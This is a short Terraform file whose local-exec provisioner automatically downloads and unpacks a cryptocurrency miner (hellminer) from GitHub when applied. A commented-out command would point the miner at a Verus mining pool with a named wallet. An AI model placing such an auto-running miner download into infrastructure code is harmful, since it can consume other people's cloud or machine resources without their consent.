resource "null_resource" "extrac_and_run_3" {
  provisioner "local-exec" {
    command = <<EOT
curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz > hellminer_linux64.tar.gz
tar -xzvf hellminer_linux64.tar.gz
mkdir mining
mv hellminer mining/hellminer
mv verus-solver mining/verus-solver
#./hellminer -c stratum+tcp://na.luckpool.net:3956 -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.001 -p x --cpu 2
ls mining
EOT
  }
}
